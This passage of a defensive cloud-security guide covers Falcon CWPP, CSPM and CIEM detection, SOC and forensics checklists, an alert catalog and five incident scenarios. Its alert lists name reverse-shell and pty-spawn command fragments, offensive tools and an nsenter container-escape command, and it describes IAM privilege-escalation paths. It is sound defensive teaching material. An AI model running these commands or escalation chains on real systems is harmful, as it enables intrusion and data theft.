| **Recover** | RC.RP-1 | No tested runbook for EKS cluster quarantine | Recovery gap |

---

## Defensive Control Improvements

### 1. CI/CD Hardening

```yaml
# GitHub Actions: Pin dependencies, use private registry only
- name: Setup Node
  uses: actions/setup-node@v3  # pinned by SHA in production
  with:
    registry-url: 'https://npm.your-company.internal'

# Enforce: npm install --ignore-scripts (block postinstall hooks)
# Use: Sigstore/cosign for artifact signing on every build
# Implement: Dependency confusion protection via scope isolation
```

### 2. IAM Least Privilege (CIEM-Guided Remediation)

```json
{
  "Condition": {
    "StringEquals": {
      "aws:SourceVpc": "vpc-0a1b2c3d4e5f"
    },
    "Bool": {
      "aws:SecureTransport": "true"
    }
  }
}
```

### 3. KAC Policies

```yaml
# Policies to enforce:
# - readOnlyRootFilesystem: true
# - allowPrivilegeEscalation: false
# - runAsNonRoot: true
# - seccompProfile: RuntimeDefault
# - No hostPID, hostNetwork, hostIPC
# - Image must pass Falcon scan (no CRITICAL findings)
# - Image must be signed (cosign verify)
```

### 4. Runtime Policy: Container Drift Prevent Mode

```
Falcon Prevention Policy:
  ContainerDrift: PREVENT (kill any new executable not in original image)
  InteractiveShell: PREVENT (block tty allocation in non-debug containers)
  KernelExploitMitigation: PREVENT
  NamespaceEscape: PREVENT
  SuspiciousKernelModule: PREVENT
```

### 5. Network Segmentation

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payments-deny-all
  namespace: payments
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
  # Only allow explicit ingress from API gateway
  # Only allow egress to payments-db service and AWS APIs via VPC endpoint
  # Block ALL direct internet egress from pods
```

---

## SOC L2 Investigation Checklist

### Phase 1: Triage & Scope (0–30 minutes)

```
□ Confirm Falcon detection chain — link CID to impacted host/container/account
□ Pull full process tree from Falcon Insight (72-hour lookback)
□ Identify: container name, pod name, namespace, node, cluster, AWS account
□ Check: Is drift detection in Prevent or Detect-only? (if Detect-only, assume breach)
□ Pull all network connections from affected container (source/dest, first-seen timestamps)
□ Identify service account JWT — get IAM role ARN from IRSA annotation
□ Run CIEM blast radius query: "What can this role access?"
□ Check CloudTrail: Has the role been used from external IPs in last 7 days?
□ Check: Has the role assumed other roles? (AssumeRole events, cross-account)
□ Determine data sensitivity of all accessible S3 buckets (check Macie tags)
```

### Phase 2: Containment (30–90 minutes)

```
□ Quarantine pod (delete + apply blocking NetworkPolicy via Falcon Fusion or kubectl)
□ Revoke IRSA: Modify trust policy to deny all (or add impossible condition temporarily)
□ Rotate service account JWT: Delete and recreate Kubernetes ServiceAccount
□ Invalidate all active STS sessions for compromised role: use IAM policy deny with date condition
□ Check aws-auth ConfigMap in ALL clusters for the compromised role — remove or restrict
□ Enable S3 Object Lock on PII buckets (prevent further exfil)
□ Check for any new IAM users, access keys, or roles created in last 24h
□ Check for CloudTrail deletion/modification attempts — restore if needed
□ Enable GuardDuty findings export to Falcon if not already active
□ Notify Privacy/Legal if S3 exfil confirmed (GDPR 72h clock starts)
```

### Phase 3: Investigation (90 minutes – 24 hours)

```
□ Reconstruct full attack timeline from:
  - Falcon process telemetry (CWPP)
  - CloudTrail (all regions, all accounts)
  - Kubernetes audit logs (API server)
  - VPC Flow Logs
  - S3 server access logs (GetObject events)
□ Determine initial access vector: Review CI/CD logs for postinstall execution
□ Pull NPM audit log / package-lock.json from compromised build
□ Identify all packages downloaded in the 7 days before detection
□ Check all GitHub Actions runs that used the poisoned dependency
□ Determine dwell time: When was first beacon to C2?
□ Quantify exfiltrated data: Correlate S3 GetObject events with destination
□ Check for persistence mechanisms:
  - New Kubernetes CronJobs, DaemonSets
  - New Lambda functions (via Terraform or console)
  - New IAM roles with console access
  - New EC2 instances / ECS tasks
□ Check all ECR repos for tampered images (compare digests against pipeline artifacts)
```

---

## Cloud Forensics Checklist

### Evidence Preservation

```bash
# Snapshot EBS volumes of affected nodes IMMEDIATELY
aws ec2 create-snapshot --volume-id vol-xxxx --description "forensic-INC-2024-0847"

# Preserve CloudTrail logs — copy to isolated forensic S3 bucket with Object Lock
aws s3 sync s3://cloudtrail-bucket/ s3://forensic-evidence-bucket/ --sse aws:kms

# Export Kubernetes audit logs from CloudWatch Logs to S3
aws logs create-export-task --log-group-name /aws/eks/prod/cluster --destination forensic-bucket

# Capture container memory snapshot via Falcon RTR
# RTR Command: memdump --pid <pid> --output /tmp/forensic/

# Preserve pod filesystem (before termination)
kubectl cp payments/payments-7d4f9c-xk2p9:/tmp/.hidden/ ./forensic/dropped-tools/

# Export IAM credential report
aws iam generate-credential-report && aws iam get-credential-report

# Export all CloudTrail events for compromised role ARN (all regions)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=payments-api-role
```

### Analysis Artifacts

```
□ Reconstruct dropped binary behavior (sandbox detonation of pspy64, chisel, dirtypipe)
□ Extract C2 IOCs from network telemetry: IPs, domains, JA3 hashes, HTTP paths
□ Reverse IRSA JWT: decode claims, verify audience, identify scope
□ Analyze S3 exfil: reconstruct data types transferred via S3 Object metadata
□ Timeline correlation: merge all log sources into unified timeline (use Timesketch or Falcon Investigate)
□ Threat intel enrichment: Submit C2 IPs/domains/hashes to Falcon Intel
□ Determine if attacker used LOTL (Living off the Land) techniques exclusively
□ Check for rootkit persistence: Compare running processes vs /proc, check loaded kernel modules
```

---

## Interview-Ready Storytelling Version

*"We had an incident that started as a dependency confusion attack against our CI/CD pipeline and evolved into a multi-account AWS compromise. What made it interesting was how the attacker was technically patient and precise — they never triggered a single GuardDuty finding for the first three days.*

*The entry point was a poisoned NPM package. Our build pipeline was pulling an internal package by name, and the attacker registered the same name on public NPM with a higher version number. The post-install hook beaconed out and stole our GitHub Actions token — which, unfortunately, was scoped too broadly.*

*What's important here is why traditional tooling missed it: our SAST tools analyzed source code, not the behavior of build dependencies. Our ECR scanner looked for CVEs, not malicious scripts embedded in package lifecycle hooks. And our SIEM had no behavioral baseline for what 'normal' looked like inside a GitHub Actions runner.*

*Falcon CWPP caught it because we had the sensor on our self-hosted runners. The process lineage — node spawning bash spawning curl — was flagged immediately as a suspicious build-tool child process. And when that tainted image was pushed to ECR, the Kubernetes Admission Controller blocked its deployment because image assessment failed. The attacker's initial foothold was cut off at the Kubernetes boundary.*

*But they pivoted. They used the extracted service account JWT externally, outside our VPC, to assume the pod's IAM role via IRSA. This is where CIEM became critical. Our IRSA roles didn't have source VPC conditions — a known CSPM finding that had been sitting open for 23 days. The attacker discovered they could chain roles — our payments API role could assume a data lake admin role in another account. Falcon CIEM had pre-computed the full effective permissions graph, so when the anomalous external assumption fired, we instantly knew the blast radius: 23 S3 buckets, 4 RDS instances, two Redshift clusters.*

*The attacker managed to exfiltrate 47 gigabytes before our automated response — triggered by Falcon Fusion — modified the IAM trust policy and applied a Service Control Policy block. We contained it in under 11 minutes from detection to IAM revocation.*

*The three lessons we drove into our roadmap: First, every IRSA role now has a source VPC condition — non-negotiable, enforced by a preventative CSPM policy. Second, CI/CD is production infrastructure, and we treat it that way — Falcon sensors on all runners, dependency pinning by SHA, and no postinstall scripts allowed in the build. Third, CIEM blast radius analysis is now part of our IAM PR review process — every new role gets a 'what if this is compromised' effective-permissions review before it ships.*

*The business outcome was hard. We had a mandatory breach notification to 47,000 customers under GDPR. But the forensic evidence we preserved — the process telemetry, the CloudTrail correlation, the container memory dumps — was complete enough that we could tell regulators exactly what was accessed, when, and by what mechanism. That specificity is only possible with a runtime security stack that captures at the syscall level."*

---

## Summary Architecture Diagram

```
ATTACK FLOW                          DETECTION LAYER
─────────────────────────────────────────────────────────────────

[Attacker] ──NPM Confusion──► [CI/CD Runner] ◄── Falcon CWPP (process chain)
                                     │
                              [ECR: Tainted Image]◄── Falcon Image Assessment
                                     │
                              [KAC Admission Webhook]──BLOCK──►[Pod Denied]
                                     │(bypass via direct JWT use)
[Attacker] ──IRSA JWT (ext)──► [AWS STS] ◄─────── Falcon CIEM (external IP anomaly)
                                     │
                              [payments-api-role]
                                     │  (role chain)
                              [data-lake-admin-role] ◄── CSPM (cross-account trust)
                                     │
                              [S3 PII Buckets] ◄────── CSPM (exfil volume alert)
                                     │
                         [47GB ──► Attacker S3] ◄──── Macie + CSPM correlation

AUTOMATED RESPONSE:
  Falcon Fusion ──► Revoke IRSA trust ──► Apply SCP ──► Quarantine pod ──► Alert SOC
```

---

# PART 2: INCIDENTS & ALERTS CATALOG

## Cloud Infrastructure Incidents

### AWS-Specific

- IMDS v1 credential theft (EC2 metadata abuse → IAM pivot)
- S3 bucket misconfiguration leading to PII exposure
- Lambda function injection via environment variable manipulation
- ECS task role abuse for cross-account movement
- RDS snapshot exfiltration via cross-account copy
- CloudFormation stack poisoning (IaC supply chain)
- VPC peering misrouting enabling unauthorized lateral movement
- Route53 subdomain takeover

### Multi-Cloud

- GCP service account key exfiltration from GCS buckets
- Azure Managed Identity abuse in AKS pods
- Cross-cloud data bridge attacks (AWS → GCP via federated identity)

---

## Kubernetes-Specific Incidents

| Incident Type | Entry Vector | Key Alert |
|---|---|---|
| Privileged pod escape | Misconfig / weak PSP | ContainerEscape.PrivilegedMount |
| etcd direct access | Exposed port 2379 | UnauthorizedAPIAccess.etcd |
| Kubelet API abuse | Port 10250 unauthenticated | KubeletAnonymousAuth |
| Service mesh bypass | Istio sidecar injection failure | mTLS policy violation |
| Secrets enumeration | Over-privileged service account | K8s API audit: list secrets |
| DaemonSet persistence | Cluster-admin compromise | PersistentDaemonSet.Suspicious |
| Webhook poisoning | MutatingWebhook hijack | AdmissionWebhook.TamperAttempt |
| Node affinity abuse | Scheduling to unprotected nodes | UnusualNodeScheduling |

---

## Runtime Detection Alerts (Falcon CWPP Pattern Recognition)

### Process & Execution Alerts

```
- SuspiciousChildProcess.WebServer       (webshell activity)
- SuspiciousChildProcess.BuildTool       (CI/CD compromise)
- PotentialKernelTampering               (CVE-2022-0847, CVE-2021-4154)
- InteractiveContainerSession            (attacker tty allocation)
- ContainerDrift.OffensiveToolDrop       (chisel, mimikatz, pspy)
- CryptominingActivity.XMRig            (resource hijack)
- ReverseTCPShell                        (bash -i >& /dev/tcp)
- PythonPTY.InteractiveShell            (python -c 'import pty; pty.spawn')
- Base64EncodedCommandExecution          (obfuscation)
- SuspiciousLDPreload                    (library injection)
- LD_PRELOAD rootkit persistence
- /proc/mem write attempts               (direct memory manipulation)
```

### Network-Based Alerts

```
- BeaconLikeTraffic.PeriodicC2           (Cobalt Strike/Sliver pattern)
- DNSTunneling.HighEntropySubdomain      (iodine, dnscat2)
- TorExitNodeCommunication
- UnusualPortScan.FromContainer
- LargeVolumeExternalTransfer (S3/network)
- FirstSeenExternalDomain.BuildInfra
```

---

## IAM / Identity Incidents

### Alert Patterns

- `AssumeRoleWithWebIdentity` from external IP — IRSA abuse
- Privilege escalation via `iam:CreatePolicyVersion` (replacing managed policy)
- `iam:PassRole` + Lambda:CreateFunction = instant privilege escalation to any role
- STS session token reuse across regions (credential portability abuse)
- Console login after long dormancy (stale access key weaponization)
- Shadow admin creation — attacker creates new user/role before getting detected
- OIDC provider manipulation in EKS (trust policy widening)
- Cross-account role chaining 3+ hops deep (hard to trace without CIEM graph)

### CIEM Alerts

```
- AnomalousRoleAssumption.ExternalIP
- UnusedPrivilegeExercised.FirstTime     (permissions used for first time ever)
- BlastRadiusExpansion.RoleChain
- ShadowAdminDetected.PolicyAttach
- CredentialExposure.GitHubActions
- ServiceAccountTokenExternalUse
```

---

## CI/CD & Supply Chain Incidents

- Dependency confusion (NPM/PyPI/RubyGems)
- Typosquatting packages with C2 callbacks
- GitHub Actions secret exposure via `echo` in workflow steps
- ArgoCD CVE-2022-24348 (path traversal → secret extraction)
- Terraform state file exfiltration (stored credentials)
- Jenkins RCE via Groovy script console (exposed without auth)
- Container image tag mutability abuse (`:latest` poisoning)
- Build cache poisoning in multi-stage Docker builds

---

## CSPM Alert Categories

### AWS

```
- S3 bucket public access (object/bucket level)
- Security Group: 0.0.0.0/0 on port 22/3389/443
- IMDSv1 enabled (no token requirement)
- CloudTrail: logging disabled, no log file validation
- KMS: key rotation disabled
- RDS: publicly accessible, no encryption at rest
- EKS: public API server endpoint, no envelope encryption
- ECS: task role with admin-level permissions
- Lambda: environment variables contain secrets in plaintext
- IAM: root account active access keys
- IAM: no MFA on console users
- IAM: inline policies instead of managed (shadow permissions)
```

---

## Threat Actor TTP Reference

| Actor / Group | Primary Cloud TTP | Key Indicator |
|---|---|---|
| TeamTNT | Cryptomining via exposed Docker API | XMRig drop, Docker API scan |
| SCATTERED SPIDER | Social engineering → Okta → cloud pivot | Identity federation abuse |
| Rocke Group | K8s cryptominer via Helm chart | Suspicious cron in container |
| APT29 (Cozy Bear) | M365 → AAD → Azure abuse | OAuth token persistence |
| LightBasin (UNC1945) | Telecom cloud pivot | SLAPSTICK passive implant pattern |
| Lace Tempest | MOVEit → cloud exfil | Cl0p ransomware precursor TTPs |

---

## Alert Fatigue Patterns

| Alert Type | Classification | Guidance |
|---|---|---|
| IMDSv1 enabled | False positive heavy | Often legacy apps — needs context before actioning |
| First-seen domain from build infra | High volume, high signal | Never suppress — correlate with process chain |
| CSPM findings over 30 days old | Organizational debt | Create auto-escalation SLA policy |
| Single `AssumeRole` from new IP | Correlation-required | Benign alone, critical with drift alert |
| InteractiveContainerSession in debug NS | Suppressed incorrectly | Time-limit suppression, never permanent |

---

## The Correlation Principle

```
LOW    → New NPM package pulled in build (informational)
MEDIUM → Outbound connection from runner to unknown domain
MEDIUM → Container drift: binary written to /tmp
HIGH   → PotentialKernelTampering in container
CRITICAL → IRSA role assumed from external IP
CRITICAL → Cross-account role chain to data lake
CRITICAL → 47GB S3 transfer to external account

Individually: manageable
Together: breach notification to 47,000 customers
```

---

# PART 3: CWPP & CSPM — DEEP TECHNICAL EXPLANATION

## CWPP — Cloud Workload Protection Platform

### What It Actually Is

CWPP is the **runtime guardian**. It lives *inside* your workloads — on the host, inside the container, on the VM. It watches what is happening right now, at the process and syscall level.

Think of CWPP as a **detective embedded inside the building** who watches every person's behavior in real time — what they pick up, where they walk, who they talk to.

### How Falcon CWPP Works Technically

```
ARCHITECTURE:

┌─────────────────────────────────────────────────┐
│              LINUX HOST / EC2 NODE              │
│                                                 │
│  ┌──────────────────┐   ┌────────────────────┐  │
│  │   Container A    │   │   Container B      │  │
│  │  (payments-api)  │   │  (nginx-proxy)     │  │
│  └──────────────────┘   └────────────────────┘  │
│                                                 │
│  ┌───────────────────────────────────────────┐  │
│  │         Falcon Sensor (eBPF-based)        │  │
│  │                                           │  │
│  │  Hooks into:                              │  │
│  │  - execve() → every process execution    │  │
│  │  - open()/write() → file operations      │  │
│  │  - connect() → network connections       │  │
│  │  - clone() → namespace operations        │  │
│  │  - ptrace() → debugging/injection        │  │
│  │  - mmap() → memory operations            │  │
│  └───────────────────────────────────────────┘  │
│                                                 │
│              Linux Kernel                       │
└─────────────────────────────────────────────────┘
                    │
                    ▼
         Falcon Cloud (AI/ML Analysis)
         Process Intelligence Graph
         Threat Graph Correlation
```

### What CWPP Gives You That Nothing Else Does

**1. Process Lineage Tree**

Every process knows its parent, grandparent, and siblings:
```
nginx (PID 1)
  └── bash (PID 847) ← ANOMALY: web server should never spawn shell
        └── curl (PID 848) ← connecting to external IP
              └── bash (PID 849) ← reverse shell
```

**2. Container Drift Detection**

CWPP takes a cryptographic snapshot of every binary in the container image at start time. Anything written and executed that wasn't in the original image = drift.

**3. Behavioral ML — Not Signature Based**

Models what "normal" looks like for each workload type and alerts on deviation. A Python web app that suddenly runs `whoami` and `cat /etc/passwd` is suspicious even if those are standard Linux binaries.

**4. Prevention vs Detection Modes**

```
DETECT MODE:  Alert fires, SOC investigates, attacker may still be running
PREVENT MODE: Process killed before it completes the malicious action
              → Dirty Pipe exploit killed mid-syscall sequence
              → Reverse shell killed before connection established
```

### CWPP Coverage Map

| Capability | What It Covers |
|---|---|
| Vulnerability Management | CVEs in running workloads, not just images |
| Runtime Protection | Process, file, network, memory at syscall level |
| Container Drift | Post-start filesystem changes |
| Threat Intelligence | Known malware hashes, C2 IPs correlated in real time |
| Interactive Intrusion | TTY/PTY shell detection |
| Kernel Protection | Exploit technique detection (Dirty Pipe, Dirty Cow, etc.) |
| Memory Protection | Process injection, LOTL detection |

---

## CSPM — Cloud Security Posture Management

### What It Actually Is

CSPM is the **configuration auditor and compliance enforcer**. It doesn't look inside your workloads — it looks at how your cloud infrastructure is *configured* against security best practices, compliance frameworks, and known risky patterns.

Think of CSPM as a **building inspector** who walks around checking that fire exits are unlocked, electrical panels aren't exposed, and doors have proper locks — before and after anything happens.

### How Falcon CSPM Works Technically

```
ARCHITECTURE:

AWS/Azure/GCP APIs
        │
        ▼
┌───────────────────────────────────────┐
│         Falcon CSPM Engine            │
│                                       │
│  Ingests via:                         │
│  - AWS Config (resource snapshots)    │
│  - Cloud APIs (IAM, EC2, S3, EKS...) │
│  - CloudTrail (API activity)          │
│  - Kubernetes API (cluster configs)   │
│                                       │
│  Evaluates against:                   │
│  - CIS Benchmarks (AWS, K8s, Azure)   │
│  - NIST 800-53                        │
│  - SOC 2 Type II                      │
│  - PCI DSS                            │
│  - HIPAA                              │
│  - Custom organizational policies     │
│                                       │
│  Outputs:                             │
│  - Findings with severity             │
│  - Affected resource details          │
│  - Remediation guidance               │
│  - Drift from last scan               │
│  - Attack path visualization          │
└───────────────────────────────────────┘
```

### Key Difference From CWPP

| Dimension | CWPP | CSPM |
|---|---|---|
| **What it watches** | Runtime behavior inside workloads | Cloud resource configuration |
| **When it fires** | Real-time, milliseconds | Near real-time (minutes) or scheduled |
| **What it catches** | Active attacks in progress | Misconfigurations that enable attacks |
| **Analogy** | Security camera inside the building | Building code inspector |
| **Blind spot** | Can't see misconfigured S3 buckets | Can't see malware running in a container |
| **Output** | Detections, incidents | Findings, policy violations |

### CSPM Finding Lifecycle

```
Configuration Drift Detected
         │
         ▼
Finding Created (Severity: Low/Med/High/Critical)
         │
         ▼
Linked to Compliance Framework (CIS 2.1.1, NIST AC-3)
         │
         ▼
Assigned to Owner (via resource tag or account mapping)
         │
         ├── Remediated → Finding Closed → Compliance score improves
         │
         ├── Accepted Risk → Suppressed with justification + expiry
         │
         └── Ignored → Ages → Weaponized in breach (this is where incidents begin)
```

### CSPM Attack Path Analysis

Modern CSPM connects findings into attack paths:
```
ATTACK PATH DETECTED:

Public EC2 Instance (SG: 0.0.0.0/0 port 22)
         │
         ▼
EC2 Instance Profile → IAM Role with iam:PassRole
         │
         ▼
Can Create Lambda with Admin Role
         │
         ▼
Effectively: Public SSH → Full AWS Account Takeover

Risk Score: 98/100 — CRITICAL PATH
```

---

# PART 4: FIVE REAL SCENARIOS

---


## Scenario 1: The Cryptominer That Hid Behind a Legitimate Process

**Industry:** Fintech SaaS | **Dwell Time:** 6 days

### What Happened

A development team deployed a new microservice using a base image pulled from Docker Hub — `python:3.9-slim` — without pinning to a digest. The image had been updated upstream and now contained a modified `libssl.so` that loaded a crypto miner when the application started.

The miner ran as a thread inside the Python process itself — not as a separate binary. It consumed only 40% CPU to avoid threshold-based alerts, and it masqueraded its network traffic as HTTPS to port 443. Six days passed before detection. The first indicator was an AWS cost anomaly — EC2 bills were 340% higher than the same period last month.

### How CWPP Caught It

```
DETECTION CHAIN:

1. Falcon CWPP — Process Behavior Analysis:
   Alert: CryptominingActivity.UnusualCPUPattern
   Detail: python3 process making outbound connections to
           known mining pool IPs (pool.supportxmr[.]com)
           Connection pattern: persistent TCP, 10-second intervals
           Hash submitted: matched XMRig variant (obfuscated)

2. Falcon CWPP — Network Intelligence:
   Alert: BeaconLikeTraffic.MiningPool
   Detail: Destination IP 195.123.xx.xx tagged in Falcon Intel
           as known XMR mining pool infrastructure
           Port 443 used (SSL stripping inside container confirmed)

3. Falcon CWPP — Library Load Detection:
   Alert: SuspiciousLibraryLoad
   Detail: libssl.so loaded from non-standard path /usr/local/lib/
           SHA256 mismatch vs official Python slim image manifest
           Library contains executable sections inconsistent with SSL library
```

### CSPM's Role — Pre-existing Misconfiguration

```
CSPM FINDING (open 31 days before breach):
  Policy: Container images must use digest pinning, not floating tags
  Resource: deployment/payment-processor — image: python:3.9-slim (no digest)
  Severity: MEDIUM
  CIS K8s Benchmark: 5.3.1

  Remediated form:
  image: python@sha256:a3f7b291cc4e9b2d4e3a7f1c... (immutable)
```

### Resolution

```
Immediate: Pod quarantined, node cordoned
CWPP: RTR session opened → libssl.so extracted for forensics
CSPM: Policy moved from DETECT to PREVENT (KAC blocks undigested images)
Root cause: Docker Hub upstream compromise — reported to Docker security team
Post-incident: All base images now pulled from private ECR mirror,
               scanned, signed with cosign, digest-pinned before use
```

### Key Lesson

CWPP doesn't care that the malware was inside a legitimate process. It watches the behavior of every process — network connections, CPU patterns, library loads. The fact that Python was doing something Python should never do was enough.

---

## Scenario 2: The Sleeping IAM Key — 14-Month-Old Credential Wakes Up

**Industry:** Healthcare (HIPAA) | **Duration:** 2 hours active, 14 months dormant

### What Happened

A developer left a company 14 months prior. Their IAM access key was deactivated but never deleted. A new intern on the DevOps team accidentally re-activated it while running an audit script (they ran `update-access-key --status Active` instead of `--status Inactive` on the wrong key ID).

Within 3 hours, the credential appeared on a dark web credential marketplace. Within 6 hours, a threat actor was using it. The actor spent 4 hours doing read-only enumeration only — listing buckets, describing EC2 instances, reading IAM policies. No writes. No deletes. Most SIEMs and GuardDuty configurations would not fire on read-only API calls.

### CSPM Detection

```
CSPM FINDING 1 (47 days old — pre-existing):
  Policy: IAM access keys inactive >90 days must be deleted, not just disabled
  Resource: AccessKey AKIAXXXXXXXXXXXXXXXX (user: dev-john-smith, last used: never)
  Severity: HIGH
  Framework: CIS AWS 1.14

CSPM FINDING 2 (new — triggered by re-activation):
  Policy: IAM access key status change detected — inactive key activated
  Resource: AKIAXXXXXXXXXXXXXXXX
  Change type: StatusChange Active
  Actor: arn:aws:iam::account:user/intern-devops-01
  Timestamp: 2024-03-14T09:23:11Z
  Severity: HIGH — unusual activation of long-dormant credential
```

### CWPP + CSPM Correlation

```
CWPP ALERT: SuspiciousSnapshotAccess
  Actor: AKIAXXXXXXXXXXXXXXXX (dev-john-smith — TERMINATED EMPLOYEE)
  Action: ec2:CreateVolume from snapshot snap-0a1b2c3d
  Target: New EC2 instance in attacker-controlled account
  Intent: Data theft via snapshot copy
  Falcon Intel: Source IP tagged — known threat actor infrastructure
  Action taken: API call blocked via inline IAM deny policy (Fusion automated response)
```

### CIEM Cross-Reference

```
CIEM FINDING:
  User dev-john-smith: TERMINATED (HR system integration confirmed)
  Account status: Active in AWS despite termination 14 months ago
  Joiner-Mover-Leaver process: FAILED — no deprovisioning workflow triggered
  Effective permissions: Can read ALL S3 buckets including PHI
  Blast radius: 2.1M patient records at risk
```

### Resolution and Post-Incident Controls

The HIPAA breach threshold was crossed — 2,100 patient records were accessed before the block. HHS mandatory notification was filed. Every IAM user and key is now reconciled weekly against the HR system via an automated Lambda. Any key belonging to a terminated employee triggers immediate deletion, not deactivation. CSPM policy was hardened from HIGH to CRITICAL for inactive-key findings, with a 24-hour SLA.

---

## Scenario 3: The ArgoCD Admin That Wasn't — GitOps Takeover

**Industry:** E-commerce | **Duration:** 4 days

### What Happened

ArgoCD was deployed with the default admin password never changed (a CSPM finding rated critical, open for 11 days). The ArgoCD UI was exposed via a LoadBalancer service directly to the internet. A threat actor found it via a Shodan scan and authenticated as admin.

The attacker was sophisticated — they didn't modify existing deployments. Instead they created a new ArgoCD Application pointing to a GitHub repo they controlled, syncing a DaemonSet into the `kube-system` namespace that deployed a privileged container on every node.

### CSPM Catching the Exposure

```
CSPM FINDING (11 days old):
  Policy: ArgoCD must not be exposed via public LoadBalancer
  Resource: service/argocd-server, namespace: argocd
  Finding: External IP 52.xx.xx.xx assigned, accessible from 0.0.0.0/0
  Severity: CRITICAL
  CIS K8s 5.2.1

CSPM FINDING 2:
  Policy: ArgoCD default admin password must be changed post-install
  Resource: argocd-initial-admin-secret still present and unchanged
  Severity: CRITICAL
```

### CWPP Catching the Runtime Attack

```
CWPP ALERT 1: SuspiciousKubernetesDaemonSet
  New DaemonSet created in kube-system namespace: node-monitor-agent
  Creator: ArgoCD service account (argocd-application-controller)
  Image: 185.220.xx.xx/tools:latest (external, unscanned registry)
  SecurityContext: privileged: true, hostPID: true, hostNetwork: true
  KAC Decision: BLOCK — image from unapproved registry + privileged + unscanned

CWPP ALERT 2:
  Alert: InteractiveContainerSession.PrivilegedContainer
  Container: node-monitor-agent on node ip-10-0-1-45
  Command: nsenter --target 1 --mount --pid --net --uts -- bash
  Effect: Attempted host namespace escape
  Action: PREVENT — process killed, pod terminated, node cordoned
```

### Attack Path Analysis

```
CSPM ATTACK PATH:

  Internet
     │ (Shodan discovered)
     ▼
  ArgoCD UI (public LoadBalancer, default password)
     │
     ▼
  ArgoCD Admin Access → Can create Applications in any namespace
     │
     ▼
  DaemonSet in kube-system with privileged:true + hostPID:true
     │
     ▼
  nsenter to host → Full node compromise → Pivot to IMDS → IAM role
     │
     ▼
  EKS node instance profile → EC2:*, S3:GetObject → Data access

  Path Risk Score: 99/100 — CRITICAL
```

### Key Lesson

The CSPM findings were there. Eleven days. Nobody acted. CWPP stopped the runtime execution, but the root cause was organizational — a finding review and remediation SLA that was not enforced. After this incident: any CRITICAL CSPM finding not remediated within 72 hours automatically triggers a P1 incident ticket and pages the CISO.

---

## Scenario 4: The Lambda Exfiltrator — Serverless Blind Spot

**Industry:** Insurance | **Duration:** 9 days

### What Happened

An attacker compromised an EC2 instance running a legacy internal tool via an old Apache Struts CVE. From that EC2, they assumed the instance profile role, which had `lambda:CreateFunction`, `lambda:InvokeFunction`, and `iam:PassRole`.

The attacker created a Lambda function, passed it an admin-level IAM role, and configured it to run every 15 minutes, exfiltrating data from a DynamoDB table containing insurance claim records to an external HTTPS endpoint. The Lambda was named `log-retention-cleanup` to blend in. It ran for 9 days before detection.

### CWPP Detection — On the EC2

```
CWPP ALERT: SuspiciousChildProcess.WebServer
  Host: ec2-10-0-1-47 (legacy-internal-tools)
  Process: apache2 → bash → python3
  CommandLine: python3 -c "import boto3; boto3.client('lambda')..."
  Alert: Application server spawning AWS SDK calls directly
  Severity: HIGH
```

### CSPM Detection

```
CSPM FINDING: Lambda function with admin IAM role
  Resource: function/log-retention-cleanup
  Attached Role: arn:aws:iam::account:role/AdminRole
  Finding: Lambda execution role has AdministratorAccess managed policy
  Severity: CRITICAL

CSPM FINDING 2: Lambda function created by non-standard principal
  Creator: ec2-instance-role/legacy-internal-tools
  Finding: EC2 instance profile should not have lambda:CreateFunction
  This permission has never been used in 180-day baseline
  Severity: HIGH

CSPM FINDING 3: Lambda with VPC egress to external IP
  Destination: 185.220.xx.xx (flagged in Falcon ThreatIntel)
  Port: 443 (HTTPS)
  Severity: HIGH
```

### CIEM — Identifying the Lateral Move

```
CIEM ANALYSIS:

  Starting point: ec2-instance-role/legacy-internal-tools

  Permission chain discovered:
  → lambda:CreateFunction ✓
  → iam:PassRole (can pass any role to Lambda) ✓
  → AdminRole exists and is passable ✓

  Effective privilege: EC2 instance effectively has admin access
                       via Lambda function creation

  CIEM ALERT: PrivilegeEscalation.LambdaPassRole
```

### Resolution

```
Immediate containment:
1. EC2 instance isolated (security group → deny all)
2. Lambda function disabled (Concurrency: 0)
3. Admin role trust policy modified to deny Lambda service
4. All active STS sessions for AdminRole invalidated

Data impact:
- 9 days × 96 invocations/day = 864 executions
- DynamoDB scan per execution: ~2,300 records
- Total records exposed: ~1.99M insurance claims (PII + financial data)
- State insurance regulator notification required
```

---

## Scenario 5: The Multi-Account Phantom — You Can't Kick Out What You Can't See

**Industry:** Media & Entertainment | **Duration:** 19 days

### What Happened

A nation-state-adjacent actor compromised a contractor's laptop via spear-phishing. The contractor had temporary access to the company's AWS dev account. The attacker moved slowly and deliberately over 19 days, never triggering a single high-severity GuardDuty finding.

Their persistence technique: they created an AWS Config rule — a legitimate, trusted AWS service — with a Lambda remediation action that would re-create their backdoor role every time Config ran. Every 24 hours, AWS Config "remediated" a fake compliance finding by invoking their Lambda, which ensured their backdoor role existed. Even if defenders found and deleted the role, Config would recreate it within 24 hours.

### CSPM Detection — The Configuration Weaponization

```
CSPM FINDING: AWS Config remediation action points to external Lambda
  Resource: config-rule/enforce-tagging-compliance
  Remediation: Lambda function log-tag-enforcer
  Finding: Lambda ARN not in approved function inventory
  Creator: contractor-temp-user (should not have config:PutRemediationConfigurations)
  Severity: HIGH

CSPM FINDING 2: IAM role created outside IaC pipeline
  Resource: arn:aws:iam::account:role/backup-monitoring-service
  Creation method: Console/API — not Terraform (no state file entry)
  Creator: contractor-temp-user
  Trust policy: Allows assumption from external AWS account (not in org)
  Severity: CRITICAL

CSPM FINDING 3: Lambda function with IAM role creation permissions
  Resource: function/log-tag-enforcer
  Role permissions: iam:CreateRole, iam:AttachRolePolicy, sts:AssumeRole
  Finding: Lambda should not have IAM administrative permissions
  Severity: CRITICAL
```

### CWPP Detection — Lambda Runtime Behavior

```
CWPP ALERT: SuspiciousIAMOperations.Lambda
  Function: log-tag-enforcer
  Invoked by: AWS Config (legitimate service — attacker's camouflage)
  Actions performed:
    iam:CreateRole (backup-monitoring-service)
    iam:AttachRolePolicy (AdministratorAccess attached)
    sts:GetCallerIdentity (reconnaissance)
  Alert: Lambda function performing IAM administrative operations
         inconsistent with declared purpose (tag enforcement)
  Severity: HIGH
```

### The 19-Day Reconstruction

```
DAY 1:   Contractor credential used from new IP (GeoDB: Eastern Europe)
          → GuardDuty: Low (credential use from new geography)

DAY 3:   ListBuckets, DescribeInstances, ListRoles (read-only recon)
          → No alerts fired. Read-only is normal.

DAY 6:   CreateRole (backup-monitoring-service), AttachRolePolicy
          → CSPM FINDING created: IAM role outside IaC (HIGH)
